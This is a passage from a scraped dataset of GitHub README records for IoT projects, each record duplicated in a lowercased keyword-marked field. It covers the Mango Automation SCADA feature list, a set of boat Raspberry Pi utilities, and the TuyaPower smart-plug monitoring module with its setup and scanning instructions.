host hundreds of data points collected from multiple data sources using multiple protocols. When more powerful equipment is used and MySQL is configured, Mango can easily support thousands or tens of thousands of points on a single instance.\nMultiple Protocols\nMango can receive data from any device for which there is a protocol driver. Currently supported protocols include BACnet I/P & MS/TP, Modbus (ASCII, RTU, TCP, and UDP), OPC DA, 1-wire, SNMP, SQL, HTTP, POP3, NMEA 0183, MBus, DNP3, OpenV, webcams, vmstat, and many proprietary protocols developed by or for hardware vendors. Mango also supports a \"virtual\" data source that can generate data for benchmarking or testing purposes. More protocols are being added regularly.\nMultiple Datastores\nMango ships with the H2 embedded database so that you don't have to have one of your own. But, Mango can also use MySQL or MSSQL for power users who need performance.\nCustom dashboards\nCreate dynamic dashboards and pages in Angular JS via a Drag and Drop style design tool built right into the web interface. In keeping with Mango's Open Source ideology the tool generates HTML and Angular directives that can be edited by hand to allow the user fine grained control of the final dashboard/page.\nMeta points\nUse scripts to create new points based upon the values of other points. Based upon Javascript, the most popular scripting language in the world, meta points allow for powerful combinations of point values as well as historical point information.\nAutomation Scripting\nNow Mango can be a powerful automaion engine. The Mango Scripting component allows you to write complex automation routines based on JavaScript. These scripts can take advantage of all the data available in your Mango instance and output to any set-able Data Point.\nUser-defined events\nTell Mango what events you are interested in. Users can define unlimited event criteria on points to detect conditions such as high and low limits, value changes, state change counts, and run-times.\nImport/Export\nExport your configuration to a text file. Save this file for backup and recovery, or use it to import into other instances of Mango to make identical copies. Or, use the file to manage very large configurations easily.\nEvent handling\nAny events that occur, either system or user defined, can be handled arbitrarily using user-defined event handlers. These handlers can send emails and escalations to mailing lists, or set values in Mango points.\nSecurity\nYour data resides where you install Mango, so you are in control. User permissions are defined by system administrators, and all communications with Mango can be secured with SSL (Secure Socket Layer), ensuring the privacy of your information.\nData logging\nEach point can be configured with its own data logging and log purging characteristics. Logging schedules can be made to be independent of reading schedules.\nReports\nCreate and schedule reports for online viewing or email. Download data in CSV format for quick upload into spreadsheets or other data analysis programs.\nData publishing\nForward information gathered by Mango to other systems in your M2M architecture in on-event fashion for near real-time updating.\nQuick charts and set points\nAccess and control is quick and up-to-date with Mango's roll-over charts and point set controls. The use of Ajax technology ensures that all of the information displayed is recent and relevent.\nWatch lists\nCreate your own custom list of points that you want to watch. Easily add and remove points from the list to keep an eye on particular point values and alarms. Create named watch lists with your favorite groups of points. Instantly see multi-point graphs of the points on your list.\nPoint hierarchies\nCreate your own arbitrary hierarchies of points and point folders to organize your information the way you want to see it.\nGraphical views\nUse images, graphics, and animations to create dynamic dashboards and graphical representations of your data. With drag and drop simplisity you can be as creative as you like.\nPoint details\nView point detail information including current value, detailed tabular and graphical charts, alarms, event detectors, and user permissions. Set point controls are also available.\nActive alarms list\nAll pages in the application include an indicator of the highest active alarm level. Use it to link to the active alarms list where you can see all active alarms at a glance. Read and add comments and link to point details pages where actions can be taken.\nUser memos\nUsers can comment on events and points so that valuable knowledge is not lost. Event comments are sent with email notifications so that all users are kept up-to-date on system status.\nEvent scheduling\nDefine events based upon time schedules. Events raised by schedules have access to all of the handling functionality that other event types have.\nAudit trail\nChanges to all information processing objects cause audit events to be raised, including new objects, changes and deletions. These events pass through the event management system so that all users can independently acknowledge the event.\nAutomatic software updates\nBe notified when new versions of Mango are available. Simply copy the new Mango version into your installation directory and all of your data will be updated automatically.\nI18N (internationalization)\nMango is fully internationalizable. New languages can be supported simply by translating the label file (and contextual documentation files). Currently translated languages are English, German, Portuguese, Dutch, Chinese and Finnish.\nRemote graphical views\nCreate portlets on your website that remotely display the views you create in Mango.\nAlarm sounds\nHear sounds when alarms are raised in Mango.\nContributing to Mango\nMango is open source and always looking for suggestions and additions. Please review our guidelines for contributions here", "link": "https://github.com/MangoAutomation/ma-core-public", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "mango automation core public code by infinite automation\nmango automation is a full featured scada / hmi solution that offers complete flexibility no matter how large or small your needs are. mango can be used in hundreds of configuration, from data protocol gateway to graphic user interface. with the mango expansion modules in the mango automation store and the ability to build custom modules, you will find everything you need in mango. here is a list of the key features available.\nspeed\nmango is a data logging, control, and monitoring system all in one featuring a browser-based interface. yet, even on small embedded computers, mango can host hundreds of data points collected from multiple data sources using multiple protocols. when more powerful equipment is used and mysql is configured, mango can easily support thousands or tens of thousands of points on a single instance.\nmultiple protocols\nmango can receive data from any device for which there is a protocol driver. currently supported protocols include bacnet i/p & ms/tp, modbus (ascii, rtu, tcp, and udp), opc da, 1-wire, snmp, sql, http, pop3, nmea 0183, mbus, dnp3, openv, webcams, vmstat, and many proprietary protocols developed by or for hardware vendors. mango also supports a \"virtual\" data source that can generate data for benchmarking or testing purposes. more protocols are being added regularly.\nmultiple datastores\nmango ships with the h2 embedded database so that you don't have to have one of your own. but, mango can also use mysql or mssql for power users who need performance.\ncustom dashboards\ncreate dynamic dashboards and pages in angular js via a drag and drop style design -----> tool !!!  built right into the web interface. in keeping with mango's open source ideology the tool generates html and angular directives that can be edited by hand to allow the user fine grained control of the final dashboard/page.\nmeta points\nuse scripts to create new points based upon the values of other points. based upon javascript, the most popular scripting language in the world, meta points allow for powerful combinations of point values as well as historical point information.\nautomation scripting\nnow mango can be a powerful automaion engine. the mango scripting component allows you to write complex automation routines based on javascript. these scripts can take advantage of all the data available in your mango instance and output to any set-able data point.\nuser-defined events\ntell mango what events you are interested in. users can define unlimited event criteria on points to detect conditions such as high and low limits, value changes, state change counts, and run-times.\nimport/export\nexport your configuration to a text file. save this file for backup and recovery, or use it to import into other instances of mango to make identical copies. or, use the file to manage very large configurations easily.\nevent handling\nany events that occur, either system or user defined, can be handled arbitrarily using user-defined event handlers. these handlers can send emails and escalations to mailing lists, or set values in mango points.\nsecurity\nyour data resides where you install mango, so you are in control. user permissions are defined by system administrators, and all communications with mango can be secured with ssl (secure socket layer), ensuring the privacy of your information.\ndata logging\neach point can be configured with its own data logging and log purging characteristics. logging schedules can be made to be independent of reading schedules.\nreports\ncreate and schedule reports for online viewing or email. download data in csv format for quick upload into spreadsheets or other data analysis programs.\ndata publishing\nforward information gathered by mango to other systems in your m2m architecture in on-event fashion for near real-time updating.\nquick charts and set points\naccess and control is quick and up-to-date with mango's roll-over charts and point set controls. the use of ajax technology ensures that all of the information displayed is recent and relevent.\nwatch lists\ncreate your own custom list of points that you want to watch. easily add and remove points from the list to keep an eye on particular point values and alarms. create named watch lists with your favorite groups of points. instantly see multi-point graphs of the points on your list.\npoint hierarchies\ncreate your own arbitrary hierarchies of points and point folders to organize your information the way you want to see it.\ngraphical views\nuse images, graphics, and animations to create dynamic dashboards and graphical representations of your data. with drag and drop simplisity you can be as creative as you like.\npoint details\nview point detail information including current value, detailed tabular and graphical charts, alarms, event detectors, and user permissions. set point controls are also available.\nactive alarms list\nall pages in the application include an indicator of the highest active alarm level. use it to link to the active alarms list where you can see all active alarms at a glance. read and add comments and link to point details pages where actions can be taken.\nuser memos\nusers can comment on events and points so that valuable knowledge is not lost. event comments are sent with email notifications so that all users are kept up-to-date on system status.\nevent scheduling\ndefine events based upon time schedules. events raised by schedules have access to all of the handling functionality that other event types have.\naudit trail\nchanges to all information processing objects cause audit events to be raised, including new objects, changes and deletions. these events pass through the event management system so that all users can independently acknowledge the event.\nautomatic software updates\nbe notified when new versions of mango are available. simply copy the new mango version into your installation directory and all of your data will be updated automatically.\ni18n (internationalization)\nmango is fully internationalizable. new languages can be supported simply by translating the label file (and contextual documentation files). currently translated languages are english, german, portuguese, dutch, chinese and finnish.\nremote graphical views\ncreate portlets on your website that remotely display the views you create in mango.\nalarm sounds\nhear sounds when alarms are raised in mango.\ncontributing to mango\nmango is open source and always looking for suggestions and additions. please review our guidelines for contributions here", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000671, "year": null}, {"Unnamed: 0": 679, "autor": 679, "date": null, "content": "Boat and Raspberry Pi Utilities\nThis repository contains a collection of utilities and tools for Raspberry Pi. They are primarily for usage on a boat, for bringing in Internet, integrating marine electronics, sensors and marine protocols.\nThat being said, some of the utilities are relevant for non-boat usage (like uart_control), some of the utilities do not require to be run on a Raspberry Pi (like gpsd2nmea, aisd or aisplay) and some have nothing to do with boats or Raspbbery Pi directly (like traffic_counter). This is a catch-all repository for auxiliary utilities I developed for my boat.\nuart_control\nTool for configuring the UART on a Raspberry Pi.\ngpsd2nmea\nDaemon for translating gpsd messages to raw NMEA messages to be used in iNavX, iSailor etc.\ntraffic_counter\nCode and instructions for measuring traffic consumed on Mikrotik(RouterOS) and OpenWrt routers.\ndometic_to_voltage\nArduino code to turn dometic sensor readings into variable voltages for displays like Simarine Pico.\nmonitoringd\nDaemon for retrieving pressure, temperature and humidity from a BME280 based sensor and storing them in InfluxDB, for visualizing on a Grafana dashboard.\naisplay\nWeb Service for displaying AIS vessels on a map.\nsensord\nSignal K Daemon for integrating a variety of different DIY Raspberry Pi sensors to a Signal K network.\naisd\n(Unmaintained / Obsolete) Daemon for making a serial or USB based AIS (Automatic Identification System) receiver wireless enabled.", "link": "https://github.com/itemir/rpi_boat_utils", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "boat and raspberry pi utilities\nthis repository contains a collection of utilities and tools for raspberry pi. they are primarily for usage on a boat, for bringing in internet, integrating marine electronics, sensors and marine protocols.\nthat being said, some of the utilities are relevant for non-boat usage (like uart_control), some of the utilities do not require to be run on a raspberry pi (like gpsd2nmea, aisd or aisplay) and some have nothing to do with boats or raspbbery pi directly (like traffic_counter). this is a catch-all repository for auxiliary utilities i developed for my boat.\nuart_control\n-----> tool !!!  for configuring the uart on a raspberry pi.\ngpsd2nmea\ndaemon for translating gpsd messages to raw nmea messages to be used in inavx, isailor etc.\ntraffic_counter\ncode and instructions for measuring traffic consumed on mikrotik(routeros) and openwrt routers.\ndometic_to_voltage\narduino code to turn dometic sensor readings into variable voltages for displays like simarine pico.\nmonitoringd\ndaemon for retrieving pressure, temperature and humidity from a bme280 based sensor and storing them in influxdb, for visualizing on a grafana dashboard.\naisplay\nweb service for displaying ais vessels on a map.\nsensord\nsignal k daemon for integrating a variety of different diy raspberry pi sensors to a signal k network.\naisd\n(unmaintained / obsolete) daemon for making a serial or usb based ais (automatic identification system) receiver wireless enabled.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000679, "year": null}, {"Unnamed: 0": 684, "autor": 684, "date": null, "content": "TuyaPower - Python Module\nThis python module will poll WiFi Tuya compatible Smart Plugs/Switches/Lights for state (on/off), current (mA), voltage (V), and power (wattage).\nDescription\nThis module uses the python tinytuya or pytuya library to poll Tuya compatible Smart Plugs, Switches and Lights for state and power data that can be used for point in time monitoring or stored for trending. There are two test scripts here. The plugpower.py script responds with a human readable output of state (on/off), current (mA), voltage (V), and power (W). The plugjson.py script responds with JSON containing the same but adds a timestamp for convenient time series processing.\nTuyaPower Setup\nTested on RaspberryPi, Linux, Windows 10 and MacOS. Install pip and the following python libraries if you haven't already.\nTuyaPower has been updated to use tinytuya, a fork of pytuya that adds support for device IDs of 20 and 22 characters (pytuya only supports 20 character IDs). Install tinytuya to take advantage of that feature.\n# Install required libraries\nsudo apt-get install python-crypto python-pip # for RPi, Linux\npython3 -m pip install pycryptodome # or pycrypto, pyaes, Crypto\npython3 -m pip install tinytuya # or pytuya\npython3 -m pip install tuyapower # Pull this tuyapower module from PyPi\nTuya Device Preparation\nPulling data from Tuya devices on your network requires that you have the Device IP, ID, VERSION and KEY (for 3.3 devices). The tuyapower and tinytuya modules include a scanner function to find Smart Plugs on your network. This will scan the network and identify Device's IP, ID and VERSION. It will not be able to get the local KEY. Since newer 3.3 devices will require the KEY, the following steps will help you determine the KEYs for your devices:\nGet the Tuya Device KEY\nDownload the \"Smart Life\" - Smart Living app for iPhone or Android. Pair with your smart plug (this is important as you cannot monitor a plug that has not been paired).\nhttps://itunes.apple.com/us/app/smart-life-smart-living/id1115101477?mt=8\nhttps://play.google.com/store/apps/details?id=com.tuya.smartlife&hl=en\nFor Device IP, ID and VERSION: Run the tuyapower scan to get a list of Tuya devices on your network along with their device IP, ID and VERSION number (3.1 or 3.3):\npython3 -m tuyapower\nFor Device KEY: If your device is running the latest protocol version 3.3 (often seen with Firmware 1.0.5 or above), you will need to obtain the Device Key. This is used to connect with the device and decrypt the response data. The following are instructions to do this and are based on https://github.com/codetheweb/tuyapi/blob/master/docs/SETUP.md:\nFrom iot.tuya.com\nCreate a Tuya Developer account on iot.tuya.com and log in.\nClick on \"Cloud\" icon -> Create a project (remember the Authorization Key: API ID and Secret for below)\nClick on \"Cloud\" icon -> select your project -> Project Overview -> Linked Device -> Link devices by App Account (tab)\nClick 'Add App Account' and it will display a QR code. Scan the QR code with the Smart Life app on your Phone (see step 1 above) by going to the \"Me\" tab in the Smart Life app and clicking on the QR code button [..] in the upper right hand corner of the app. When you scan the QR code, it will link all of the devices registered in your \"Smart Life\" app into your Tuya IoT project.\nIMPORTANT Under \"API Management\" -> \"API Products\" and ensure the API groups have status \"Subscribed\": Smart Home Devices Management, Authorization and Smart Home Family Management (see screenshot here) - Make sure you authorize your Project to use these 3 API groups:\nClick each of the API boxes\nClick \"Projects\" tab\nClick \"New Authorization\" button\nSelect your Project from the dropdown and click OK (see screenshot here)\nFrom your Local Workstation\nFrom your PC/Mac you can run the TinyTuya Setup Wizard to fetch the Device KEYs for all of your registered devices:\npython3 -m tinytuya wizard\n# If you are using windows command prompt w/o color use:\npython -m tinytuya wizard -nocolor\nThe Wizard will prompt you for the API ID key, API Secret, API Region (us, eu, cn or in) from your Tuya IoT project noted above. It will also ask for a sample Device ID. Use one from step 2 above or found in the Device List on your Tuya IoT project.\nThe Wizard will poll the Tuya IoT Platform and print a JSON list of all your registered devices with the \"name\", \"id\" and \"key\" of your registered device(s). The \"key\"s in this list are the Device KEYs you will use to poll your devices.\nIn addition to displaying the list of devices, Wizard will create a local file devices.json. TinyTuya will use this file to provide additional details to scan results from tinytuya.scanDevices() or when running python3 -m tinytuya to scan your local network.\nNotes:\nIf you ever reset or re-pair your smart devices, they will reset their LOCAL_KEY and you will need to repeat these steps above.\nThe TinyTuya Wizard was inspired by the TuyAPI CLI which is an alternative way to fetch the Device KEYs: npm i @tuyapi/cli -g and run tuya-cli wizard\nFor a helpful video walk-through of getting the KEYS you can also watch this great Tech With Eddie YouTube tutorial: https://youtu.be/oq0JL_wicKg.\nProgramming with TuyaPower\nTuyaPower Module Functions\ndeviceInfo - Poll device and return on, w, mA, V and err data.\n(on, w, mA, V, err) = tuyapower.deviceInfo(PLUGID, PLUGIP, PLUGKEY, PLUGVERS)\ndeviceRaw - Poll device and return raw response data.\nrawData = tuyapower.deviceRaw(PLUGID, PLUGIP, PLUGKEY, PLUGVERS)\ndevicePrint - Poll device and print formatted output to stdout.\ntuyapower.devicePrint(PLUGID, PLUGIP, PLUGKEY, PLUGVERS)\ndeviceJSON - Poll device and return JSON formatted details.\ndataJSON = tuyapower.deviceJSON(PLUGID, PLUGIP, PLUGKEY, PLUGVERS)\ndeviceScan(verbose, max_retries=15) - Scans network for smart plug devices and return dictionary of devices and power data.\nverbose = False\ndevices = tuyapower.deviceScan(verbose)\nscan(max_retries=15) - This is a shortcut for deviceScan() that prints formatted output to stdout for UDP ports 6666 and 6667. By default, the scan functions will retry 15 times to find new devices. If you are not seeing all your devices, you can increase max_retries.\nParameters:\nPLUGID = Device ID e.g. 01234567891234567890\nPLUGIP = Device IP Address e.g. 10.0.1.99\nPLUGKEY = Device Key e.g. 0123456789abcdef\nPLUGVERS = Version of Protocol 3.1 or 3.3\nverbose = Print more details - True or False (default is False)\nmax_retries = Number of times to retry scan of new devices (default is 15)\nResponse Data:\non = Switch state (single) - true or false\non = Switch state (multiswitch) - dictionary of state for each switch e.g. {'1':True, '2':False}\nw = Wattage\nmA = milliamps\nV = Voltage\nerr = Error message or OK (power data found)\nrawData = Raw response from device\ndevices = Dictionary of all devices found with power data if available\nNote: If error occurs, on will be set to false, w, mA and V will be set to 0.\nProgramming Examples\nYou can import the tuyapower module into your own python projects and use the deviceInfo(), deviceJSON(), deviceScan() and devicePrint() functions to access data on your Tuya devices. Here are some examples:\n# Poll a Single Devices\nimport tuyapower\nPLUGID = '01234567891234567890'\nPLUGIP = '10.0.1.99'\nPLUGKEY = '0123456789abcdef'\nPLUGVERS = '3.1'\n(on, w, mA, V, err) = tuyapower.deviceInfo(PLUGID,PLUGIP,PLUGKEY,PLUGVERS)\ntuyapower.deviceJSON(PLUGID,PLUGIP,PLUGKEY,PLUGVERS)\n'{ \"datetime\": \"2019-10-13T03:58:57Z\", \"switch\": \"True\", \"power\": \"1.2\", \"current\": \"70.0\", \"voltage\": \"122.1\", \"response\": \"OK\" }'\ntuyapower.devicePrint(PLUGID,PLUGIP,PLUGKEY,PLUGVERS)\nTuyaPower (Tuya Power Stats)\nDevice 03200160dc4f2216ff61 at 10.0.1.5 key 0123456789abcdef protocol 3.1:\nSwitch On: True\nPower (W): 1.200000\nCurrent (mA): 70.000000\nVoltage (V): 122.100000\nProjected usage (kWh): Day: 0.028800 Week: 0.201600 Month: 0.873600\n# Scan Network for All Devices\n# To see output on stdout set verbose True\ntuyapower.deviceScan(True)\nTuyaPower (Tuya compatible smart plug scanner) [0.0.16]\nScanning on UDP ports 6666 and 6667 for devices...\nFOUND Device [Valid payload]: 10.0.1.100\nID = 01234567891234567890, Key = 0123456789abcdef, Version = 3.1\nStats: on=True, W=6.0, mA=54.0, V=121.1 [OK]\nFOUND Device [Valid payload]: 10.0.1.200\nID = 01234567891234567891, Key = 0123456789abcdea, Version = 3.1\nStats: on=True, W=-99, mA=-99, V=-99 [Power data unavailable]\nFOUND Device [Valid payload]: 10.0.1.222\nID = 01234567891234567893, productKey = 0123456789abcdea, Version = 3.3\nDevice Key required to poll for stats\nScan Complete! Found 3 devices.\n# Scan the network and unpack the response\ndevices = tuyapower.deviceScan()\nfor ip in devices:\nid = devices[ip]['gwId']\nkey = devices[ip]['productKey']\nvers = devices[ip]['version']\n(on, w, mA, V, err) = deviceInfo(id, ip, key, vers)\nprint(\"Device at %s: ID %s, state=%s, W=%s, mA=%s, V=%s [%s]\"%(ip,id,on,w,mA,V,err))\nTuya Device Scan Tool\nThe function tuyapower.scan() will listen to your local network and identify Tuya devices broadcasting their IP, Device ID, Product Key (not the Local KEY) and protocol Version. It will print the list of devices and for 3.1 protocol devices that don't require local KEY, it will display their energy stats. This can help you get a list of compatible devices on your network. The tuyapower.deviceScan() function returns all found devices and their stats via a dictionary result.\nYou can run the scanner from the command line using this:\npython3 -m tuyapower\nBy default, the scan functions will retry 15 times to find new devices. If you are not seeing all your devices, you can increase max_retries by passing an optional arguments (ex. 50 retries):\n# command line\npython3 -m tuyapower 50\n# invoke verbose interactive scan\ntuyapower.scan(50)\n# return payload of devices\ndevices = tuyapower.deviceScan(false, 50)\nDocker Setup (Optional)\nTested on Linux and MacOS. Build a docker container using Dockerfile\n# build tuyapower container\ndocker build -t tuyapower .\n# Devices with older firmware (1.0.4 and below)\n# run tuyapower container - replace with device ID and IP\ndocker run -e PLUGID='01234567891234567890' -e PLUGIP=\"10.0.1.x\" -e PLUGKEY=\"0123456789abcdef\" tuyapower\n# Devices with newer firmware (1.0.5 and above)\n# run tuyapower container - replace with device ID and IP\ndocker run -e PLUGID='01234567891234567890' -e PLUGIP=\"10.0.1.x\" -e PLUGKEY=\"0123456789abcdef\" -e PLUGVERS=\"3.3\" tuyapower\nExample Products\nTanTan Smart Plug Mini Wi-Fi Enabled Outlet with Energy Monitoring (3.1 protocol device) - https://www.amazon.com/gp/product/B075Z17987/ref=oh_aui_detailpage_o03_s00?ie=UTF8&psc=1\nSKYROKU SM-PW701U Wi-Fi Plug Smart Plug - https://wikidevi.com/wiki/Xenon_SM-PW701U\nWuudi SM-S0301-US - WIFI Smart Power Socket Multi Plug with 4 AC Outlets and 4 USB Charging\nGosund SP1 - WiFi High Amp RatedSmart Power Socket (eu) (3.3 protocol device) - https://www.amazon.de/Steckdose-Stromverbrauch-Funktion-Fernsteurung-Netzwerk/dp/B07B911Y6V\nGosund - Smart Light Switch (us) (3.3 protocol device) - https://www.amazon.com/gp/product/B07DQG4K52/ref=ppx_yo_dt_b_search_asin_title?ie=UTF8&psc=1\nGoKlug - Smart Plug with Energy Monitoring (us) (3.3 protocol device) - https://www.amazon.com/gp/product/B083SK787X/ref=ppx_yo_dt_b_search_asin_title?ie=UTF8&psc=1\nTreatlife WiFi Light Switch 3 Way Switch (us) (3.3 protocol device) - https://www.amazon.com/gp/product/B07V4X7BRT/ref=ppx_yo_dt_b_search_asin_title?ie=UTF8&psc=1\nAcknowledgements\nTuyaAPI https://github.com/codetheweb/tuyapi by codetheweb and blackrozes For protocol reverse engineering, additional protocol reverse engineering from jepsonrob and clach04\nPyTuya https://github.com/clach04/python-tuya by clach04 The origin of this python module (now abandoned)\nhttps://github.com/rospogrigio/localtuya-homeassistant by rospogrigio Edit to pytuya to support devices with Device IDs of 22 characters\nPowerMonitor https://github.com/jasonacox/powermonitor\nContributors\nJason A. Cox (jasonacox)\nPhill Healey (codeclinic) - Integration for firmware 1.0.5+ / protocol v3.3 & commandline arguments.", "link": "https://github.com/jasonacox/tuyapower", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "tuyapower - python module\nthis python module will poll wifi tuya compatible smart plugs/switches/lights for state (on/off), current (ma), voltage (v), and power (wattage).\ndescription\nthis module uses the python tinytuya or pytuya library to poll tuya compatible smart plugs, switches and lights for state and power data that can be used for point in time monitoring or stored for trending. there are two test scripts here. the plugpower.py script responds with a human readable output of state (on/off), current (ma), voltage (v), and power (w). the plugjson.py script responds with json containing the same but adds a timestamp for convenient time series processing.\ntuyapower setup\ntested on raspberrypi, linux, windows 10 and macos. install pip and the following python libraries if you haven't already.\ntuyapower has been updated to use tinytuya, a fork of pytuya that adds support for device ids of 20 and 22 characters (pytuya only supports 20 character ids). install tinytuya to take advantage of that feature.\n# install required libraries\nsudo apt-get install python-crypto python-pip # for rpi, linux\npython3 -m pip install pycryptodome # or pycrypto, pyaes, crypto\npython3 -m pip install tinytuya # or pytuya\npython3 -m pip install tuyapower # pull this tuyapower module from pypi\ntuya device preparation\npulling data from tuya devices on your network requires that you have the device ip, id, version and key (for 3.3 devices). the tuyapower and tinytuya modules include a scanner function to find smart plugs on your network. this will scan the network and identify device's ip, id and version. it will not be able to get the local key. since newer 3.3 devices will require the key, the following steps will help you determine the keys for your devices:\nget the tuya device key\ndownload the \"smart life\" - smart living app for iphone or android. pair with your smart plug (this is important as you cannot monitor a plug that has not been paired).\nhttps://itunes.apple.com/us/app/smart-life-smart-living/id1115101477?mt=8\nhttps://play.google.com/store/apps/details?id=com.tuya.smartlife&hl=en\nfor device ip, id and version: run the tuyapower scan to get a list of tuya devices on your network along with their device ip, id and version number (3.1 or 3.3):\npython3 -m tuyapower\nfor device key: if your device is running the latest protocol version 3.3 (often seen with firmware 1.0.5 or above), you will need to obtain the device key. this is used to connect with the device and decrypt the response data. the following are instructions to do this and are based on https://github.com/codetheweb/tuyapi/blob/master/docs/setup.md:\nfrom iot.tuya.com\ncreate a tuya developer account on iot.tuya.com and log in.\nclick on \"cloud\" icon -> create a project (remember the authorization key: api id and secret for below)\nclick on \"cloud\" icon -> select your project -> project overview -> linked device -> link devices by app account (tab)\nclick 'add app account' and it will display a qr code. scan the qr code with the smart life app on your phone (see step 1 above) by going to the \"me\" tab in the smart life app and clicking on the qr code button [..] in the upper right hand corner of the app. when you scan the qr code, it will link all of the devices registered in your \"smart life\" app into your tuya iot project.\nimportant under \"api management\" -> \"api products\" and ensure the api groups have status \"subscribed\": smart home devices management, authorization and smart home family management (see screenshot here) - make sure you authorize your project to use these 3 api groups:\nclick each of the api boxes\nclick \"projects\" tab\nclick \"new authorization\" button\nselect your project from the dropdown and click ok (see screenshot here)\nfrom your local workstation\nfrom your pc/mac you can run the tinytuya setup wizard to fetch the device keys for all of your registered devices:\npython3 -m tinytuya wizard\n# if you are using windows command prompt w/o color use:\npython -m tinytuya wizard -nocolor\nthe wizard will prompt you for the api id key, api secret, api region (us, eu, cn or in) from your tuya iot project noted above. it will also ask for a sample device id. use one from step 2 above or found in the device list on your tuya iot project.\nthe wizard will poll the tuya iot platform and print a json list of all your registered devices with the \"name\", \"id\" and \"key\" of your registered device(s). the \"key\"s in this list are the device keys you will use to poll your devices.\nin addition to displaying the list of devices, wizard will create a local file devices.json. tinytuya will use this file to provide additional details to scan results from tinytuya.scandevices() or when running python3 -m tinytuya to scan your local network.\nnotes:\nif you ever reset or re-pair your smart devices, they will reset their local_key and you will need to repeat these steps above.\nthe tinytuya wizard was inspired by the tuyapi cli which is an alternative way to fetch the device keys: npm i @tuyapi/cli -g and run tuya-cli wizard\nfor a helpful video walk-through of getting the keys you can also watch this great tech with eddie youtube tutorial: https://youtu.be/oq0jl_wickg.\nprogramming with tuyapower\ntuyapower module functions\ndeviceinfo - poll device and return on, w, ma, v and err data.\n(on, w, ma, v, err) = tuyapower.deviceinfo(plugid, plugip, plugkey, plugvers)\ndeviceraw - poll device and return raw response data.\nrawdata = tuyapower.deviceraw(plugid, plugip, plugkey, plugvers)\ndeviceprint - poll device and print formatted output to stdout.\ntuyapower.deviceprint(plugid, plugip, plugkey, plugvers)\ndevicejson - poll device and return json formatted details.\ndatajson = tuyapower.devicejson(plugid, plugip, plugkey, plugvers)\ndevicescan(verbose, max_retries=15) - scans network for smart plug devices and return dictionary of devices and power data.\nverbose = false\ndevices = tuyapower.devicescan(verbose)\nscan(max_retries=15) - this is a shortcut for devicescan() that prints formatted output to stdout for udp ports 6666 and 6667. by default, the scan functions will retry 15 times to find new devices. if you are not seeing all your devices, you can increase max_retries.\nparameters:\nplugid = device id e.g. 01234567891234567890\nplugip = device ip address e.g. 10.0.1.99\nplugkey = device key e.g. 0123456789abcdef\nplugvers = version of protocol 3.1 or 3.3\nverbose = print more details - true or false (default is false)\nmax_retries = number of times to retry scan of new devices (default is 15)\nresponse data:\non = switch state (single) - true or false\non = switch state (multiswitch) - dictionary of state for each switch e.g. {'1':true, '2':false}\nw = wattage\nma = milliamps\nv = voltage\nerr = error message or ok (power data found)\nrawdata = raw response from device\ndevices = dictionary of all devices found with power data if available\nnote: if error occurs, on will be set to false, w, ma and v will be set to 0.\nprogramming examples\nyou can import the tuyapower module into your own python projects and use the deviceinfo(), devicejson(), devicescan() and deviceprint() functions to access data on your tuya devices. here are some examples:\n# poll a single devices\nimport tuyapower\nplugid = '01234567891234567890'\nplugip = '10.0.1.99'\nplugkey = '0123456789abcdef'\nplugvers = '3.1'\n(on, w, ma, v, err) = tuyapower.deviceinfo(plugid,plugip,plugkey,plugvers)\ntuyapower.devicejson(plugid,plugip,plugkey,plugvers)\n'{ \"datetime\": \"2019-10-13t03:58:57z\", \"switch\": \"true\", \"power\": \"1.2\", \"current\": \"70.0\", \"voltage\": \"122.1\", \"response\": \"ok\" }'\ntuyapower.deviceprint(plugid,plugip,plugkey,plugvers)\ntuyapower (tuya power stats)\ndevice 03200160dc4f2216ff61 at 10.0.1.5 key 0123456789abcdef protocol 3.1:\nswitch on: true\npower (w): 1.200000\ncurrent (ma): 70.000000\nvoltage (v): 122.100000\nprojected usage (kwh): day: 0.028800 week: 0.201600 month: 0.873600\n# scan network for all devices\n# to see output on stdout set verbose true\ntuyapower.devicescan(true)\ntuyapower (tuya compatible smart plug scanner) [0.0.16]\nscanning on udp ports 6666 and 6667 for devices...\nfound device [valid payload]: 10.0.1.100\nid = 01234567891234567890, key = 0123456789abcdef, version = 3.1\nstats: on=true, w=6.0, ma=54.0, v=121.1 [ok]\nfound device [valid payload]: 10.0.1.200\nid = 01234567891234567891, key = 0123456789abcdea, version = 3.1\nstats: on=true, w=-99, ma=-99, v=-99 [power data unavailable]\nfound device [valid payload]: 10.0.1.222\nid = 01234567891234567893, productkey = 0123456789abcdea, version = 3.3\ndevice key required to poll for stats\nscan complete! found 3 devices.\n# scan the network and unpack the response\ndevices = tuyapower.devicescan()\nfor ip in devices:\nid = devices[ip]['gwid']\nkey = devices[ip]['productkey']\nvers = devices[ip]['version']\n(on, w, ma, v, err) = deviceinfo(id, ip, key, vers)\nprint(\"device at %s: id %s, state=%s, w=%s, ma=%s, v=%s [%s]\"%(ip,id,on,w,ma,v,err))\ntuya device scan -----> tool !!! \nthe function tuyapower.scan() will listen to your local network and identify tuya devices broadcasting their ip, device id, product key (not the local key) and protocol version. it will print the list of devices and for 3.1 protocol devices that don't require local key, it will display their energy stats. this can help you get a list of compatible devices on your network. the tuyapower.devicescan() function returns all found devices and their stats via a dictionary result.\nyou can run the scanner from the command line using this:\npython3 -m tuyapower\nby default, the scan functions will retry 15 times to find new devices. if you are not seeing all your devices, you can increase max_retries by passing an optional arguments (ex. 50 retries):\n# command line\npython3 -m tuyapower 50\n# invoke verbose interactive scan\ntuyapower.scan(50)\n# return payload of devices\ndevices = tuyapower.devicescan(false, 50)\ndocker setup (optional)\ntested on linux and macos. build a docker container using dockerfile\n# build tuyapower container\ndocker build -t tuyapower .\n# devices with older firmware (1.0.4 and below)\n# run tuyapower container - replace with device id and ip\ndocker run -e plugid='01234567891234567890' -e plugip=\"10.0.1.x\" -e plugkey=\"0123456789abcdef\" tuyapower\n# devices with newer firmware (1.0.5 and above)\n# run tuyapower container - replace with device id and ip\ndocker run -e plugid='01234567891234567890' -e plugip=\"10.0.1.x\" -e plugkey=\"0123456789abcdef\" -e plugvers=\"3.3\" tuyapower\nexample products\ntantan smart plug mini wi-fi enabled outlet with energy monitoring (3.1 protocol device) - 